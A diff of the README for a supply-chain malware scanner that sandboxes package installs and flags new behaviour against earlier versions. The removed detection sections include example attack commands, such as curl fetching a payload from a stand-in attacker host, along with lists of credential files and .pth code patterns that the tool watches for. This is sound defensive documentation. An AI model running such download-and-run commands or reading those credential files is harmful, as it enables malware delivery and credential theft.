@@ -14,29 +14,19 @@ Think of it as a behavioral diff between "the version you're about to install" a
 If nothing suspicious is found, your original command is forwarded and runs normally. If something new shows up, `gyrseek` aborts and tells you why.
 
 > [!WARNING]
-> **Scope: supply chain malware only.** `gyrseek` is built specifically to catch malware that infects packages and acts at install time, in the style of Shai-Hulud: credential theft, new network endpoints, downloaded or dropped executables, and similar behavior changes between versions. It is **not suitable for protecting against other types of sophisticated malware**, such as targeted or anti-analysis malware, malware that evades tracing or detects it is being scanned, or anything that tries to escape the sandbox. For **second-stage payloads**, `gyrseek` detects the behavior of a second stage happening during the install (for example a new network endpoint, a downloaded or dropped executable, or a newly started process), but it does **not analyze the payload itself**: it never inspects what the downloaded code does or contains. A loader that fetches or runs its real payload outside the install window (after a delay, on first import, on a later run, or only under conditions the sandbox does not reproduce) will not show that behavior during the scan at all. A clear result means no new install-time behavior was observed compared with the baseline versions. It does not mean the package is safe. See [Package Related Supply Chain Attack Detection Coverage](#package-related-supply-chain-attack-detection-coverage) for what is and is not covered.
+> **Scope: supply chain malware only.** `gyrseek` is built specifically to catch malware that infects packages and acts at install time, in the style of Shai-Hulud: credential theft, new network endpoints, downloaded or dropped executables, and similar behavior changes between versions. It is **not suitable for protecting against other types of sophisticated malware**, such as targeted or anti-analysis malware, malware that evades tracing or detects it is being scanned, or anything that tries to escape the sandbox. For **second-stage payloads**, `gyrseek` detects the behavior of a second stage happening during the install (for example a new network endpoint, a downloaded or dropped executable, or a newly started process), but it does **not analyze the payload itself**: it never inspects what the downloaded code does or contains. A loader that fetches or runs its real payload outside the install window (after a delay, on first import, on a later run, or only under conditions the sandbox does not reproduce) will not show that behavior during the scan at all. A clear result means no new install-time behavior was observed compared with the baseline versions. It does not mean the package is safe. See [Package Related Supply Chain Attack Detection Coverage](docs/DETECTION_COVERAGE.md#package-related-supply-chain-attack-detection-coverage) for what is and is not covered.
 
 ## Table of Contents
 
 - [Introduction](#introduction)
 - [Quick Start](#quick-start)
-- [Just Recipes](#just-recipes)
 - [Supported Commands](#supported-commands)
 - [Usage](#usage)
 - [How It Works](#how-it-works)
-  - [Network Behavior Detection](#network-behavior-detection)
-  - [Git Clone Behavior Detection](#git-clone-behavior-detection)
-  - [Process-Execution Behavior Detection](#process-execution-behavior-detection)
-  - [Sensitive File Access Behavior Detection](#sensitive-file-access-behavior-detection)
-  - [Post-Install Artifact Behavior Detection](#post-install-artifact-behavior-detection)
-- [Package Related Supply Chain Attack Detection Coverage](#package-related-supply-chain-attack-detection-coverage)
-- [Configuration](#configuration)
-- [Sandbox Modes](#sandbox-modes)
-- [Prebuilt Scanner Images](#prebuilt-scanner-images)
-- [Behavior Reference](#behavior-reference)
+- [Configuration](docs/CONFIGURATION.md#configuration)
+- [Sandbox Modes](docs/SANDBOX.md#sandbox-modes)
 - [Docker Security](#docker-security)
-- [Testing](#testing)
-- [Project Layout & Docs](#project-layout--docs)
+- [Documentation](#documentation)
 - [License](#license)
 
 ## Introduction
@@ -120,60 +110,6 @@ Without `gh`, download the same files from the Releases page; the hash check wor
 
 That's it. `gyrseek` resolves the version, runs the sandbox behavioral diff, and either forwards your command or blocks it with an explanation.
 
-## Just Recipes
-
-The `Justfile` contains convenience recipes for common tasks. All recipes run from the repo root regardless of where you call them from.
-
-| Recipe | What it does |
-|---|---|
-| `just build` | Builds the release binary (`target/release/gyrseek`). |
-| `just install` | Installs `gyrseek` into Cargo's bin directory with `cargo install --path . --locked`. |
-| `just uninstall` | Uninstalls `gyrseek` with `cargo uninstall gyrseek`. |
-| `just tag` | Tags the current `HEAD` with the version string from `Cargo.toml` (e.g. `v1.2.3`), requires `HEAD` to be `origin/main` and waits for its CI run to pass (needs `gh`), refuses a version `origin` already has, and pushes the tag to `origin`, which starts the release workflow. |
-| `just fmt` | Formats the Rust code. |
-| `just test` | Runs `cargo test --all-features --locked`. |
-| `just lint` | Runs `cargo check`, clippy for all targets/features, and a format check. Use this before committing. |
-| `just test-npm` | End-to-end test (Docker): scans and installs `lodash`, then runs `npm update` and `npm i` against the test fixture in `tests/npm/`. Builds the release binary first. |
-| `just test-pnpm` | End-to-end test (Docker): scans and adds `lodash`, then runs `pnpm update` and `pnpm i` against the test fixture in `tests/pnpm/`. Builds the release binary first. |
-| `just test-pip` | End-to-end test (Docker): creates a venv, then scans and installs `black`, the packages from `tests/pip/requirements.txt`, and runs `pip3 install --upgrade pip` via `pip3`. Builds the release binary first. |
-| `just test-poetry` | End-to-end test (Docker): scans `poetry add black`, `poetry install --no-root`, `poetry update`, and `poetry lock` from the `tests/poetry/` fixture. Builds the release binary first. |
-| `just test-uv` | End-to-end test (Docker): scans `uv add black`, `uv pip install`, `uv sync`, and `uv lock` from the `tests/uv/` fixture. Builds the release binary first. |
-| `just test-docker` | Runs all Docker end-to-end tests (`test-npm`, `test-pnpm`, `test-pip`, `test-poetry`, `test-uv`). |
-| `just docker-build-python` | Builds the Python scanner image from `docker/Dockerfile.python` as `gyrseek-python-scanner:latest`. |
-| `just docker-build-npm` | Builds the npm/pnpm scanner image from `docker/Dockerfile.npm` as `gyrseek-npm-scanner:latest`. |
-| `just image-pins` | Compares the digest-pinned Python and Node sandbox base images built into `gyrseek` (`src/runtime_image.rs`) with the registry and prints `ok` or `DRIFT` for each. Needs Docker; run it before a release (see `AGENTS.md` for the refresh steps). |
-
-**Typical workflow:**
-
-```bash
-# Build once
-just build
-
-# Install into Cargo's bin directory
-just install
-
-# Uninstall from Cargo's bin directory
-just uninstall
-
-# Tag HEAD with the Cargo.toml version and push to origin
-just tag
-
-# Run tests
-just test
-
-# Check everything is healthy before pushing
-just lint
-
-# Run a live end-to-end test for the manager you changed
-just test-npm
-just test-pnpm
-just test-pip
-just test-uv
-just test-poetry
-```
-
-> The end-to-end recipes use the Docker sandbox. Make sure Docker is running before executing them.
-
 ## Supported Commands
 
 | Ecosystem  | Commands                                                                                                                              |
@@ -184,7 +120,7 @@ just test-poetry
 | **npm**    | `npm install`, `npm i`, `npm update`                                                                                                  |
 | **pnpm**   | `pnpm add`, `pnpm install`, `pnpm i`, `pnpm update`                                                                                   |
 
-> Standalone `git clone` runtime interception is not enabled yet — only install-time clone behavior _inside_ package scans is enforced today (see [Git Clone Behavior](#git-clone-behavior-detection)).
+> Standalone `git clone` runtime interception is not enabled yet — only install-time clone behavior _inside_ package scans is enforced today (see [Git Clone Behavior](docs/DETECTION.md#git-clone-behavior-detection)).
 
 > **`--version` / `-V`:** pass either flag as the first argument to print `gyrseek <version>` and exit 0. This works with no config file or Docker present. A forwarded command's own trailing `--version` (e.g. `gyrseek pip install foo --version`) is passed through unchanged.
 
@@ -251,11 +187,11 @@ cargo run npm install lodash
    Multiple packages and versions may run in one sandbox session while keeping per-package, per-version trace attribution. Bulk commands (`uv sync`, `uv pip sync`, etc.) apply this to every detected package.
 
 4. **Compare behavior signals** between the target and its baselines:
-   - **Network**: endpoints contacted during install (see [Network Behavior Detection](#network-behavior-detection)).
-   - **Git clone**: install-time `git clone` command signatures (see [Git Clone Behavior Detection](#git-clone-behavior-detection)).
-   - **Process execution**: all programs executed during install — the payload's own commands plus the sandbox's internal setup (see [Process-Execution Detection](#process-execution-behavior-detection)).
-   - **Sensitive files**: attempts to read sensitive credentials or configuration files (see [Sensitive File Access Behavior Detection](#sensitive-file-access-behavior-detection)).
-   - **Artifacts**: post-install file inventory of every installed file — binary executables, suspicious `.pth` files, unexpected runtimes, and large files (see [Post-Install Artifact Detection](#post-install-artifact-behavior-detection)).
+   - **Network**: endpoints contacted during install (see [Network Behavior Detection](docs/DETECTION.md#network-behavior-detection)).
+   - **Git clone**: install-time `git clone` command signatures (see [Git Clone Behavior Detection](docs/DETECTION.md#git-clone-behavior-detection)).
+   - **Process execution**: all programs executed during install — the payload's own commands plus the sandbox's internal setup (see [Process-Execution Detection](docs/DETECTION.md#process-execution-behavior-detection)).
+   - **Sensitive files**: attempts to read sensitive credentials or configuration files (see [Sensitive File Access Behavior Detection](docs/DETECTION.md#sensitive-file-access-behavior-detection)).
+   - **Artifacts**: post-install file inventory of every installed file — binary executables, suspicious `.pth` files, unexpected runtimes, and large files (see [Post-Install Artifact Detection](docs/DETECTION.md#post-install-artifact-behavior-detection)).
 5. **Decide**:
    - If one or more behavioral anomalies are found (e.g., new endpoint, clone behavior, process execution, sensitive file read, or artifact finding) → **all findings are aggregated, reported together, and the install is blocked (exits non-zero)**. It does not short-circuit on the first failure.
    - Nothing new → **forward your original command**.
@@ -270,220 +206,24 @@ This gives you a _behavioral_ signal, rather than relying only on package metada
 
 > **PEP 508 extras** (e.g. `requests[security]`) are handled correctly: the extras are stripped for registry lookups and version-pin bookkeeping (so the PyPI lookup hits `requests`, not a 404), while the forwarded install command keeps the full `requests[security]==<scanned version>` spec.
 
-### Network Behavior Detection
+The detail of each check is in [docs/DETECTION.md](docs/DETECTION.md); known attack waves and the verdict on each are in [docs/DETECTION_COVERAGE.md](docs/DETECTION_COVERAGE.md).
 
-`gyrseek` uses syscall tracing (`strace`) during sandbox installs to observe outbound network connections.
-
-- It captures connection target IPs — **both IPv4 and IPv6**, normalized to canonical form — from the trace output.
-- It computes the difference between **current version** and **baseline versions** using domain-aware FCrDNS diffing.
-- Any endpoint whose domain (or IP, when unresolvable) has not been seen in baseline traffic is treated as a behavioral anomaly.
-- Install-time `git clone` command signatures (e.g. clone target and recursive-clone usage) are also diffed across versions.
-- Install-time execution of all programs is captured and diffed across versions to catch download-and-run payloads — see [Process-Execution Detection](#process-execution-behavior-detection).
-- Post-install file inventory (binary executables, suspicious `.pth` files, unexpected runtimes, files >10 MB) is recorded and diffed across versions — see [Post-Install Artifact Detection](#post-install-artifact-behavior-detection).
-- New IPs are **always** treated as anomalies (fail-closed), unless the IP's FCrDNS resolves to a domain already seen in baseline traffic — in which case it is silently discarded as a benign CDN edge rotation.
-- Domain-aware IP diff resolves each IP via FCrDNS and compares at the domain level, not the IP level. If a current IP resolves to a domain already seen in baseline traffic (e.g. a rotated Fastly edge IP for `files.pythonhosted.org`), it is silently discarded — no hardcoded domain list needed. This handles benign CDN edge rotations for any infrastructure automatically. Unresolvable IPs fall back to plain IP membership so the diff stays fail-closed for genuinely new or spoofed endpoints.
-- The `domain_allowlist` uses **forward-confirmed reverse DNS (FCrDNS)**: a PTR hostname is only trusted if it resolves _forward_ back to the original IP. An attacker who sets their C2 server's PTR record to an allowlisted domain cannot bypass the allowlist, because the allowlisted domain's real A/AAAA record does not point back at the C2 IP.
-- **Environment variables:** Because reading an environment variable (e.g. `process.env.AWS_KEY`) does not make a system call, it is invisible to `strace`. However, `gyrseek` does not need to see the read. If a package reads a secret and attempts to exfiltrate it over the network, the **Network Behavior Detection** flags the new connection to the attacker's IP/domain and kills the install. Exfiltration is caught at the network boundary, regardless of how the payload encrypts or hides the secret in transit.
-
-Example — abnormal network behavior detected:
-
-```text
-❌ [gyrseek] CRITICAL WARNING: network_anomaly flagged!
-Package 'left-pad', version '1.3.0' contacted new endpoints not seen in baseline versions (1.2.0, 1.1.3): ["203.0.113.42 -> suspicious-c2.example"]
-```
-
-Example — a new hidden install-time `git clone` detected:
-
-```text
-❌ [gyrseek] CRITICAL WARNING: git_clone_anomaly flagged!
-Package 'left-pad', version '1.3.0' introduced new git clone behavior not seen in baseline versions (1.2.0, 1.1.3): ["https://github.com/unknown/repo.git|non-recursive"]
-```
-
-### Git Clone Behavior Detection
-
-- **Install-time clones** (e.g. hidden `git clone` calls inside package scripts) are compared across package versions during scanning, and new behavior is fail-closed unless allowlisted.
-- Clone-detection logic is exercised via inline unit tests in `src/scanning.rs` (moved from the old `tests/git_clone_behavior_tests.rs`).
-- **Runtime interception of direct `git clone ...` shell commands is not enabled yet** in the CLI parser.
-
-### Process-Execution Behavior Detection
-
-`gyrseek` takes a least-privilege approach to program execution during installation. Any process a package runs that it didn't run in previous versions is treated as suspect.
-
-#### How it works
-It captures **every** `execve` system call inside the sandbox, extracts the executable name and its exact arguments to form a signature, and diffs them against baseline versions. If a new or changed process execution appears, it fails closed.
-
-#### Common Attack Patterns Caught
-- **Download-and-Execute (Bun/Deno):** Many attacks don't assume a malicious runtime is present — they download one. For example, the Shai-Hulud "Hades/miasma" PyPI wave downloads the Bun JavaScript runtime and runs an obfuscated stealer via `bun run _index.js`.
-- **System Utilities & Shell Scripts (`curl`, `wget`, `bash`, `sh`):** If a package uses `curl` or `wget` to download a payload (e.g., `curl http://attacker.com/payload.sh`), or executes a shell script (e.g., `bash ./malicious.sh` or `sh -c "echo payload"`), the exact executable and its arguments are captured as a signature (like `curl|-O|http://attacker.com/payload.sh` or `bash|./malicious.sh`). Any newly introduced utility/script execution, or an existing utility with new/changed arguments, is flagged. *(Note: The network connection made by `curl` or `wget` is independently caught by the Network Behavior Detection).*
-
-#### Reducing Noise
-- **Harness Exclusion:** The sandbox's own install commands (e.g., `uv pip install`, `npm install`) and interpreter-discovery subprocesses are automatically filtered out. Only the package's own behavior contributes to the diff.
-- **Allowlisting:** Expected new behavior can be explicitly permitted using the `process_exec_allowlist` config key (see [Configuration](#configuration)).
-
-> **Scope Limitation:** This observes processes executed _inside the sandbox during install_ (e.g., npm `preinstall`/`postinstall` hooks or Python `setup.py` execution). Attacks that defer execution to the _next interpreter startup_ (like the PyPI `*-setup.pth` variant) execute outside this window. However, Gyrseek's post-install artifact scan catches the `.pth` file itself before the install finishes (see [Post-Install Artifact Detection](#post-install-artifact-behavior-detection)).
-
-### Sensitive File Access Behavior Detection
-
-`gyrseek` traces `open` and `openat` system calls to actively monitor for credential and configuration theft attempts. While checking environmental variables directly is not possible due to `strace` limitations, monitoring sensitive file access provides a robust defense against exfiltration techniques.
-
-#### How it works
-If an installation script unexpectedly reads highly sensitive files (e.g., `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.npmrc`, `~/.env`, `/etc/passwd`), `gyrseek` captures the hex-escaped path via `strace` and unescapes it for analysis. The accessed files are then diffed against baseline versions. If a new package version accesses sensitive files that older versions never touched, the install is immediately blocked.
-
-#### Why Baseline Diffing is Essential Here
-It might seem safer to unconditionally block *any* sensitive file access (ignoring baselines entirely), but this is impractical for a scanner that wraps the entire install process:
-- **Package Managers**: The `strace` trace captures the behavior of the package manager itself. `npm` and `yarn` **always** read `~/.npmrc` to find registry URLs and auth tokens. `pip` often reads `/etc/passwd` to resolve the user's home directory.
-- **Private Git Dependencies**: If a package has a private git dependency (e.g., `"git+ssh://git@github.com/..."`), the package manager will spawn `git clone`, which legitimately reads `~/.ssh/id_rsa` or `~/.git-credentials` to authenticate.
-- **Private Registries**: Companies using AWS CodeArtifact for their private package registry may trigger an AWS credential helper under the hood, which legitimately reads `~/.aws/credentials` during the install.
-- **Legitimate Build Tools**: Some packages legitimately read `.env` files during `postinstall` to generate client code (e.g., Prisma).
-
-If `gyrseek` blocked sensitive file reads unconditionally, almost every `npm install` would fail simply because `npm` read `~/.npmrc`, and any project with a private git dependency would break. The baseline diff solves this: if a package has always relied on a private git dependency, the baseline version's installation *also* read `~/.ssh/id_rsa`. `gyrseek` sees no *new* sensitive reads, allowing the install to proceed. However, if a normal utility like `lodash` suddenly tries to read `~/.ssh/id_rsa` in a compromised version, the diff catches the brand new read attempt and blocks it instantly.
-
-> **Note on SDKs (e.g., AWS SDK):** Legitimate SDKs (like `boto3` or `@aws-sdk/client-s3`) **do not** read credentials like `~/.aws/credentials` during installation. They only read them at runtime when imported by your application. Therefore, a clean install of the AWS SDK will not trigger an alert. If an installation *does* try to read them, it is almost certainly a malicious script.
-
-### Post-Install Artifact Behavior Detection
-
-`gyrseek` runs a comprehensive file inventory inside the Docker container **after each install probe**, recording every installed file (path, size, executable format and, for `.pth` files, the first 300 bytes of content). Classification happens on the Rust side, so new IOC patterns are detected without container script changes.
-
-The classifier emits four signal categories:
-
-1. **`binary`** — ELF, Mach-O, or PE executables deposited in the install tree. Catches cryptominers, compiled malware, and arbitrary native binaries.
-2. **`suspicious_pth`** — Python `.pth` files containing executable code (`import`, `exec`, `eval`, `urllib`, `subprocess`, `ctypes`, `socket` patterns). These are essentially never used by legitimate namespace-path `.pth` files and are the Hades/Miasma delivery mechanism.
-3. **`unexpected_runtime`** — bun/deno runtime binaries (identified by filename and binary type). Emitted in addition to the `binary` finding for the same file. Catches download-and-execute attacks that leave a runtime behind.
-4. **`large_file`** — any file >10 MB in the install tree. Catches data exfiltration staging and large payload drops.
-
-**How it works** — after each per-probe install step in the Docker matrix script, one `find` (over `/work`, `/home/gyrseek`, `/var/tmp`, `/run/lock` and `/dev/shm`) and one interpreter process inventory every regular file there (a `node_modules` of 10,000 files takes milliseconds, not the minutes of a process per file), capturing the size, the executable format (ELF, Mach-O or PE, recognised from the file's own first bytes, since the scanner images have no `file` command) and, for `.pth` files, the first 300 bytes of content. The interpreter is the one the package manager needs anyway: Python for pip, uv and poetry, Node for npm and pnpm. A custom scanner image (`GYRSEEK_PY_SCANNER_IMAGE`, `GYRSEEK_NPM_SCANNER_IMAGE`) therefore has it too; if it does not, or it fails, the scan stops with a message instead of continuing with an empty inventory. The raw inventory is written to `gyrseek_artifacts_N.log` (in the root-only trace tmpfs, then streamed to the host), embedded in the probe trace, and classified by `classify_inventory_lines` in scanning.rs before entering the diff pipeline. Files the scanner user leaves outside the install tree (`/home/gyrseek`, `/var/tmp`, `/run/lock`, `/dev/shm`, two of which allow execution; a normal install writes nothing there) are reported as `dropped_file`, and those places are emptied between probes so one probe cannot leave something for the next. What it does not cover: `/tmp` (it is `noexec` and busy with temporary files), symlinks, other places that a custom scanner image may let the scanner user write to (the list is fixed, measured in the two default images), and scripts, WebAssembly and Java classes inside `/work` (open findings #476 and #477). A binary or large file counts as new only if its name is new after replacing the hash or version in it (`libtiff-0c352bdc.so.6.3.0` and `libtiff-aa11bb22.so.6.4.1` are the same file); a file with a new name, in a new directory or of another format is flagged, and `artifact_allowlist` can unblock a known one.
-
-**Diff-based verdict** — like all of gyrseek's detection signals, artifact findings are compared across versions. A finding present in a baseline version is expected; a finding newly appearing in the current version (absent from all baselines) is **fail-closed**:
-
-```text
-❌ [gyrseek] CRITICAL WARNING: Suspicious artifact(s) discovered after install flagged!
-Package 'evil-pkg', version '2.0.0' introduced new suspicious file artifact(s) not
-seen in baseline versions (1.9.0, 1.8.0): ["suspicious_pth|/work/site-packages/evil.pth|import socket"]
-This may indicate a .pth file with executable content or an unexpected runtime binary.
-```
-
-This closes the Hades/Miasma `.pth` write-to-disk gap — the `.pth` file is written during `pip install` (as ordinary file I/O, invisible to strace's `network,execve` filter) but detected by the post-install artifact scan before the container session ends. The same pipeline catches ELF-based payloads, large data exfiltration, and any future file-level IOC — all without modifying the container script.
-
-## Package Related Supply Chain Attack Detection Coverage
-
-gyrseek is checked against a table of real supply chain attack waves (Shai-Hulud, TeamPCP and others), each with its verdict: caught during install, partly caught, or missed because the malicious code runs outside the install and import window. Read it in [docs/DETECTION_COVERAGE.md](docs/DETECTION_COVERAGE.md), including what gyrseek reliably catches and the core gap (execution that is deferred past the sandbox run).
+Per-command behavior, version handling and lockfile rules: [docs/BEHAVIOR_REFERENCE.md](docs/BEHAVIOR_REFERENCE.md).
 
 ## Configuration
 
-`gyrseek` reads a YAML policy file to allowlist known-good endpoints and tune its release gates.
-
-### CLI Arguments
-
-Gyrseek supports the following global CLI arguments. `--version` must be the first argument and `--config`/`-c` must come before the package manager command (e.g., `gyrseek --config=./my.yaml npm install`). `--no-sandbox`, `--no-import-scan` and `--danger-disable-seccomp` are accepted anywhere and are never forwarded to the package manager.
-
-| Argument | Description |
-|---|---|
-| `--version`, `-V` | Prints the current Gyrseek version and exits. |
-| `--config`, `-c` | Path to the YAML policy file. Overrides the default `gyrseek.yaml` and `GYRSEEK_CONFIG` environment variable. Example: `--config=./policy.yaml`. |
-| `--no-sandbox` | Runs probes directly on the host with **no isolation** (detection only; Linux/WSL2, needs `strace`, and no post-install artifact scan or import-time scan). See [Sandbox Modes](#sandbox-modes). |
-| `--no-import-scan` | Skips the import-time scan: installed packages are not loaded in the sandbox (equivalent to `import_scan: false`). |
-| `--danger-disable-seccomp` | Disables the embedded default-allow seccomp profile during the sandbox phase. This drastically reduces the sandbox's security guarantees and should only be used for debugging. |
-
-
-**Config path:** defaults to `gyrseek.yaml` in the working directory. Override it with `--config` / `-c` or the `GYRSEEK_CONFIG` environment variable:
-
-```bash
-./target/release/gyrseek --config ./security-policy.yaml npm install
-./target/release/gyrseek -c ./security-policy.yaml npm install
-GYRSEEK_CONFIG=./security-policy.yaml ./target/release/gyrseek npm install
-```
-
-### Config keys
-
-| Key                           | Default       | Purpose                                                                                                                                                                                                                                                        |
-| ----------------------------- | ------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `ip_allowlist`                | empty         | IPs to ignore before anomaly blocking. Supports **global** entries (`- "1.2.3.4"`) and **per-package** entries (`- pkg: ["5.6.7.8"]`) in the same list. Effective set = global ∪ per-package; per-package entries never reduce global protection. Canonicalized (equivalent IPv6 forms match); invalid entries are skipped with a warning. |
-| `domain_allowlist`            | empty         | Domains to ignore. Same semantics and syntax: effective set = global ∪ per-package (see `ip_allowlist`). Lowercased, trailing `.` stripped. Subdomains match parents (`cdn.example.com` matches `example.com`). Only **forward-confirmed** PTR hostnames (FCrDNS) are matched, so a spoofed reverse-DNS record cannot bypass the allowlist. |
-| `artifact_allowlist`          | empty         | Artifact findings to allow **per package** (map of package name to list of allowed artifacts; exact `type\|path\|details` or prefix `type\|path`). New artifacts not in baselines and not allowlisted fail closed. Example: `binary\|/work/bin/tool`.               |
-| `git_clone_allowlist`         | empty         | Git clone targets to allow **per package** when new install-time clone behavior appears (the repository is matched case-insensitively, option values such as paths are case-sensitive). A URL entry covers a plain or `--recursive` clone only; a clone that also uses `--config`/`-c`, `--upload-pack`, `--template` or `--reference` has those options in its signature (`url\|non-recursive\|config:k=v`) and needs that full signature listed.                                                                                                                                                    |
-| `sensitive_file_access_allowlist` | empty         | Sensitive file reads to ignore **per package** (map of package name to list of allowed paths). A leading `*` matches a read whose path equals, or ends in `/`, the text after the `*`. E.g. `*.env` matches a read of `.env` or `/work/.env`, not `foo.env`. |
-| `baseline_overrides`          | none          | Pin baseline versions **per package** via `baseline-1` / `baseline-2`. Missing keys fall back to registry-derived baselines.                                                                                                                                       |
-| `baseline_count`              | `2`           | How many historical baselines to compare against.                                                                                                                                                                                                              |
-| `min_baseline_age_hours`      | `72`          | **Per-package** minimum age (hours) before a version is eligible as a baseline. Packages not listed use the default. Values below 24h are clamped to the 24h security floor (with a warning).                                       |
-| `new_package_exemptions`      | none          | Map of package names to their specifically vetted version (e.g. `requests: "1.0.0"`). Exempts the pinned version when fewer than 2 eligible baselines exist. Helps prevent exemption-list rot since newer versions naturally ignore the pinned exemption. |
-| `internal_package_exemptions` | none          | Skip specific packages **entirely** — no registry history fetch, no sandbox install, no diff. For first-party / internal packages served from a private index (e.g. Nexus) that `gyrseek`'s public-registry lookups can't resolve, so scanning only yields noise. The package is forwarded unscanned at its requested version.            |
-| `trusted_index_hosts`         | none          | Hosts, besides the public registry (`pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`), that a package-manager index or registry setting may point at: `--index-url`, `--extra-index-url`, `--find-links`, `--registry`, `PIP_INDEX_URL`, `UV_INDEX_URL`, `npm_config_registry`, a requirements file's `--index-url`, `pip.conf`, `uv.toml` / `[tool.uv]`, `[[tool.poetry.source]]` or `.npmrc`. `gyrseek` scans the public package of the same name and version, so an install redirected to any other host exits 1 (dependency confusion) unless the host is listed here. List only a mirror of the public registry that you trust (Nexus, Artifactory); for a locked install the lockfile hashes must still be the public registry's, so the mirror cannot serve other files (a package named on the command line is not hash-checked, open finding #481); a package that exists only on a private index also needs `internal_package_exemptions`. Entries are bare host names, matched exactly (no wildcards, no suffixes; a short intranet name such as `nexus` is fine). A scoped registry (`@corp:registry=…` in `.npmrc`) counts for the whole command, not only for packages of that scope, and `pip --isolated` does not switch the check off. |
-| `minimum_release_age_package` | off           | Minimum release age in **days**. When set, runs before burst/anomaly checks and fails closed if the current release is younger.                                                                                                                                |
-| `release_burst_threshold`     | off           | Fails closed if a package published at least this many versions within the burst window.                                                                                                                                                                       |
-| `python_version`              | auto          | Python minor version for the Python sandbox (`"3.11"`; supported: 3.10–3.14). Wins over project files. An unsupported value is a config error. |
-| `node_version`                | auto          | Node major version for the npm/pnpm sandbox (`"22"`; supported: 20, 22, 24, 26). Wins over project files. An unsupported value is a config error. |
-| `probe_timeout_seconds`       | `300`         | Wall-clock limit (seconds) for each install probe. A probe that exceeds it blocks that package (fail closed); the rest of the batch is still scanned. `0` falls back to `300`. Raise it for slow native builds. |
-| `import_scan`                 | `true`        | Load each installed package in the sandbox after its install and compare what that does (see the import-time scan above). `false` turns it off, like `--no-import-scan`. |
-| `import_timeout_seconds`      | `300`         | Wall-clock limit (seconds) for loading one package. A load that exceeds it blocks the package as `import_failed`. `0` falls back to `300`. |
-| `import_*_allowlist`          | empty         | `import_ip_allowlist`, `import_domain_allowlist`, `import_git_clone_allowlist`, `import_process_exec_allowlist`, `import_artifact_allowlist`, `import_sensitive_file_access_allowlist`: the same formats and validation as the install-time keys, applied only to behaviour at import time. |
-| `trace_limit`                 | `1024m`       | Size of the root-only tmpfs that holds one install probe's trace (the largest trace accepted for a probe); a probe that fills it is blocked on its own. A size such as `512m`, `2g` or `65536k`. The `GYRSEEK_TRACE_LIMIT` environment variable overrides it. The tmpfs counts against the container memory limit (`GYRSEEK_MEM_LIMIT`, default `2g`), so keep the two in proportion. |
-| `release_burst_window_hours`  | `24`          | Lookback window (hours) for the burst checker.                                                                                                                                                                                                                 |
-| `process_exec_allowlist`      | empty         | Process-execution signatures (`bun\|run\|build`) or bare executables (`bun`) that are allowed **per package** even when newly introduced. All executables are monitored by default; only signatures in this list escape the fail-closed diff. Sandbox harness commands are always excluded. |
-
-### Example config
+`gyrseek` reads a YAML policy file (`gyrseek.yaml` by default, or `--config <path>`, or `GYRSEEK_CONFIG`) to allowlist known-good endpoints and tune its release gates.
 
 ```yaml
 ip_allowlist:
-  - 151.101.0.223        # global — applies to all packages
-  - 151.101.64.223
-  - my-private-pkg:      # per-package — only applies to my-private-pkg
+  - 151.101.0.223        # global: applies to all packages
+  - my-private-pkg:      # per-package: only applies to my-private-pkg
     - 10.0.0.1
-domain_allowlist:
-  - pypi.org             # global
-  - files.pythonhosted.org
-  - boto3:               # per-package — only applies to boto3
-    - s3.amazonaws.com
-git_clone_allowlist:
-  evil-pkg:
-    - https://github.com/acme/repo.git
-
-process_exec_allowlist:
-  buildy:
-    - bun|run|build
-    - deno
-
-artifact_allowlist:
-  aws-sdk:
-    - binary|/work/bin/aws-helper
-    - suspicious_pth|/work/site-packages/aws.pth
-
-sensitive_file_access_allowlist:
-  my-database-tool:
-    - "*.env"
-  my-aws-tool:
-    - "*.aws/credentials"
-baseline_overrides:
-  requests:
-    baseline-1: "2.30.0"
-    baseline-2: "2.29.0"
-  lodash:
-    baseline-1: "4.17.20"
 baseline_count: 2
-min_baseline_age_hours:
-  requests: 72
-  lodash: 96
-new_package_exemptions:
-  newly-published-package: "1.0.0"
-internal_package_exemptions:
-  - internal-pkg-logger          # first-party package served from a private Nexus index
-trusted_index_hosts:
-  - nexus.corp.example           # a mirror of the public registry that this machine's pip.conf / .npmrc points at
-minimum_release_age_package: 3
-release_burst_threshold: 3
-release_burst_window_hours: 24
-probe_timeout_seconds: 300
-import_timeout_seconds: 300   # optional; import_scan: false (or --no-import-scan) skips loading packages
-import_process_exec_allowlist:
-  some-package: ["ldconfig|-p"]   # allowed when the package is loaded, not when it is installed
-trace_limit: 1024m             # optional; GYRSEEK_TRACE_LIMIT overrides
-python_version: "3.12"        # optional; otherwise .python-version / pyproject.toml, then 3.13
-node_version: "22"            # optional; otherwise .nvmrc / .node-version / engines.node, then 26
+release_burst_threshold: 20
 ```
 
-### Config loading behavior
-
-- If `gyrseek.yaml` is **missing**, `gyrseek` runs with an empty allowlist.
-- If a **custom** config path is provided and can't be read, `gyrseek` **fails closed**.
+Every key, the CLI arguments, a full example and the loading rules are in [docs/CONFIGURATION.md](docs/CONFIGURATION.md).
 
 ## Sandbox Modes
 
@@ -494,267 +234,27 @@ node_version: "22"            # optional; otherwise .nvmrc / .node-version / eng
 | **Docker** (default) | (default)         | Safer default. Requires the Docker CLI and a running daemon; if either is missing, `gyrseek` stops at startup with exit code 1 and says which. |
 | **Host**             | `--no-sandbox`    | Fastest, **no isolation and zero protection (detection only)**. This mode exists purely for running in isolated environments — see warning below. |
 
-```bash
-./target/release/gyrseek npm install
-./target/release/gyrseek --no-sandbox pip3 install -r requirements.txt
-```
-
-- If sandbox initialization fails, `gyrseek` exits non-zero (fail-closed).
-- Host mode does not load installed packages, so there is no import-time scan there either (OPEN #490).
-- Host mode runs no post-install artifact scan, so the `binary`, `suspicious_pth`, `unexpected_runtime` and `large_file` findings are only produced in Docker mode.
-- The retired `GYRSEEK_SANDBOX` environment variable is ignored.
-- ⚠️ **Host mode has to be requested explicitly with `--no-sandbox`.** There is no environment variable that selects it, so a stray or inherited setting cannot switch isolation off. Like `--danger-disable-seccomp`, the flag is consumed wherever it appears and is never forwarded to the package manager.
-- ⚠️ **Host mode provides no protection, only detection.** There is no sandbox at all: the probe runs the package (the unvetted candidate included) directly on your machine as your user, with your filesystem, network and environment. If the package is malicious it has already executed by the time `gyrseek` reports it; the block only stops the follow-up install. The trace has no integrity protection either, since the payload runs as the same user that reads it. Run it only in a very isolated, disposable environment with no secrets, no credentials and no access to internal networks; the environment itself must be the sandbox. Never on a developer laptop or any machine holding real credentials.
-
-### Platform support matrix
-
